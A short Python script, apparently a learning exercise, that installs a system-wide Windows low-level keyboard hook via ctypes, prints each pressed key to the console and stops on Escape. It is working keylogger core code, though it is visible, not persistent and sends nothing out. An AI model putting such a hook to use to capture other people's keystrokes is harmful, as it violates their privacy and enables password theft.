from ctypes import *
from ctypes.wintypes import *

user32 = windll.user32
kernel32 = windll.kernel32
kHandle = kernel32.GetModuleHandleW
hook = None

def getHook(pointer):
    global hook

    hook = user32.SetWindowsHookExA(13, pointer, kernel32.GetModuleHandleW(), 0)

    return True if hook else False

def getPointer(fName):
    func = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))

    return func(fName)

def sendLog():
    msg = MSG()

    return user32.GetMessageA(byref(msg), 0, 0, 0)

def unHook():
    global hook

    user32.UnhookWindowsHookEx(hook)
    hook = None

def hookProc(nCode, wParam, lParam):
    if wParam != (0x0100):
        return user32.CallNextHookEx(hook, nCode, wParam, lParam)

    hookKey = chr(lParam[0])
    print(hookKey)

    if lParam[0] == 0x1B:
        print("종료")
        unHook()

    return user32.CallNextHookEx(hook, nCode, wParam, lParam)

pointer = getPointer(hookProc)

if getHook(pointer):
    print("성공")
    sendLog()
else:
    print("실패")
